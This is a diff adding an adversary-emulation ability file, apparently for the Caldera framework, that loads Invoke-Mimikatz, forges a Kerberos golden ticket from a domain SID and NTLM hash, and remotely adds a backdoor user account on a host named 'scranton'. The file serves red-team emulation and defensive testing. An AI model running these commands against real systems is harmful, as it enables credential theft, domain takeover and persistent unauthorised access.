@@ -1,0 +1,63 @@
+ability_id: 267bad86-3f06-49f1-9a3e-6522f2a61e7a
+access: {}
+additional_info: {}
+buckets:
+- credential-access
+delete_payload: true
+description: Perfofrm Mimikatz credential collection
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'klist purge;
+
+    . .\Invoke-Mimikatz.ps1;
+
+    invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm}
+    /user:#{target.winrm.username} /ptt";
+
+    klist;
+
+    invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - Invoke-Mimikatz.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'klist purge;
+
+    . .\Invoke-Mimikatz.ps1;
+
+    invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm}
+    /user:#{target.winrm.username} /ptt";
+
+    klist;
+
+    invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - Invoke-Mimikatz.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Execute Invoke-Mimikatz
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: credential-access
+technique_id: T1003
+technique_name: Credential Dumping
